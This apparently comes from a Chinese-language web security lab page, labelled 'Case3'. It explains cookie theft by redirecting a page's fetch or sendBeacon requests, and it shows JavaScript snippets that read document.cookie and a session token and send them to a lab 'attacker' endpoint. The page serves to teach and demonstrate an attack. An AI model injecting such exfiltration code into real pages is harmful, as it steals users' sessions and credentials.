😈 Case3 攻击：Fetch/Beacon Cookie 窃取

🎯 攻击原理

受害者在 case3-shop.html 页面中使用 fetch API 加载数据或使用 sendBeacon 发送数据时， 如果目标 URL 可以被攻击者控制，攻击者可以构造一个恶意 URL， 将请求发送到自己的服务器，从而在请求中携带受害者的 cookie。

攻击流程：

  1. 攻击者准备一个恶意服务器端点（/api/attacker/steal），用于接收 cookie
  2. 攻击者构造恶意 URL，指向自己的服务器端点
  3. 攻击者需要修改 case3-shop.html 中的 fetch 或 sendBeacon 的目标 URL（实际攻击中可能通过 XSS 或其他方式）
  4. 当受害者访问 case3-shop.html 并触发 fetch 或 sendBeacon 时，请求会发送到攻击者服务器
  5. 攻击者服务器从请求头中提取 cookie（如果设置了 credentials: 'include'）
  6. 攻击者在后台查看窃取的 cookie

注意：由于同源策略，fetch 默认不会发送 cookie 到不同域。 但如果受害者页面设置了 credentials: 'include' 或服务器设置了 CORS 允许携带 cookie， 攻击者就可以获取到 cookie。

💻 攻击代码展示

方式一：通过修改 fetch URL

// 在受害者页面（case3-shop.html）中，如果 fetch 的 URL 可以被控制：
// 原始代码（受害者）： fetch('/api/products') .then(res => res.json()) .then(data => { /* 处理数据 */ });
// 攻击者修改后的代码（通过 XSS 或其他方式注入）： const attackerUrl = '/api/attacker/steal?cookie=' + encodeURIComponent(document.cookie);
fetch(attackerUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, credentials: 'include', // 携带 cookie body: JSON.stringify({ caseId: 'case3', attackType: 'fetch_hijack', cookies: document.cookie, case3Token: document.cookie .split('; ') .find(c => c.startsWith('case3Token=')) ?.split('=')[1] }) });

方式二：通过修改 sendBeacon URL

// 在受害者页面关闭时，如果 sendBeacon 的 URL 可以被控制：
// 原始代码（受害者）： window.addEventListener('beforeunload', () => { navigator.sendBeacon('/api/beacon', JSON.stringify(data)); });
// 攻击者修改后的代码： window.addEventListener('beforeunload', () => { const payload = JSON.stringify({ caseId: 'case3', attackType: 'beacon_hijack', cookies: document.cookie, case3Token: document.cookie .split('; ') .find(c => c.startsWith('case3Token=')) ?.split('=')[1], originalData: data }); navigator.sendBeacon('/api/attacker/steal', payload); });

🔗 恶意 URL 构造

攻击者需要构造以下 URL，作为 fetch 或 sendBeacon 的目标：

/api/attacker/steal
// 或者通过 URL 参数传递 cookie（如果 URL 长度允许）： /api/attacker/steal?cookie=...
